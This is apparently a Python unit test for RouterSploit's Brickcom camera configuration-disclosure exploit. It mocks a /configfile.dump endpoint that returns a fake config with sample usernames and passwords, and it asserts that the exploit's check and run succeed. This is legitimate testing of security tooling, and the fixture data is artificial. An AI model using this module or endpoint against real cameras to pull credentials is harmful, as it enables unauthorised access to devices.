from routersploit.modules.exploits.cameras.brickcom.corp_network_cameras_conf_disclosure import Exploit


configfile = (
    "DeviceBasicInfo.firmwareVersion=v3.0.6.12"
    "DeviceBasicInfo.macAddress=00:00:00:00:00:00"
    "DeviceBasicInfo.sensorID=OV9X11"
    "DeviceBasicInfo.internalName=Brickcom"
    "DeviceBasicInfo.productName=Di-1092AX"
    "DeviceBasicInfo.displayName=CB-1092AX"
    "DeviceBasicInfo.modelNumber=XXX"
    "DeviceBasicInfo.companyName=Brickcom Corporation"
    "DeviceBasicInfo.comments=[CUBE HD IPCam STREEDM]"
    "DeviceBasicInfo.companyUrl=www.brickcom.com"
    "DeviceBasicInfo.serialNumber=AXNB02B211111"
    "DeviceBasicInfo.skuType=LIT"
    "DeviceBasicInfo.ledIndicatorMode=1"
    "DeviceBasicInfo.minorFW=1"
    "DeviceBasicInfo.hardwareVersion="
    "DeviceBasicInfo.PseudoPDseProdNum=P3301"
    "AudioDeviceSetting.muted=0"
    "UserSetSetting.userList.size=2"
    "UserSetSetting.userList.users0.index=0"
    "UserSetSetting.userList.users0.password=MyM4st3rP4ss"
    "UserSetSetting.userList.users0.privilege=1"
    "UserSetSetting.userList.users0.username=Cam_User"
    "UserSetSetting.userList.users1.index=0"
    "UserSetSetting.userList.users1.password=C0mm0mP4ss"
)


def test_check_v1_success(target):
    """ Test scenario - successful check via method 1 """

    route_mock = target.get_route_mock("/configfile.dump", methods=["GET"])
    route_mock.return_value = configfile

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 80

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check()
    assert exploit.run() is None
